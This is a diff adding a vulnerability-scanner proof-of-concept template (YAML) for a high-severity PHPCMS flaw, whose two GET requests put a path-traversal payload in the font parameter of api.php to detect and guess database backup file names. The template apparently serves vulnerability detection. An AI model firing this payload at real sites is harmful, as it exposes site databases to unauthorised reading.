@@ -1,0 +1,22 @@
+id: poc-yaml-phpcms-api-guess-backup-file-vuln
+info:
+  name: PHPCMS 数据库备份文件名可猜测漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: PHPCMS
+  osprey-id: vb_2018_0016
+requests:
+- method: GET
+  path: /api.php?op=creatimg&txt=dysec&font=/../../../../caches/bakup/default/notfound.sql
+  expression: 'contains(body, "Cannot Initialize new GD image stream")
+
+    '
+- method: GET
+  path: /api.php?op=creatimg&txt=dysec&font=/../../../../caches/bakup/default/<<.sql
+  expression: '!contains(body, "Cannot Initialize new GD image stream") && contains(body,
+    "PNG")
+
+    '
+variables: {}
+transport: http
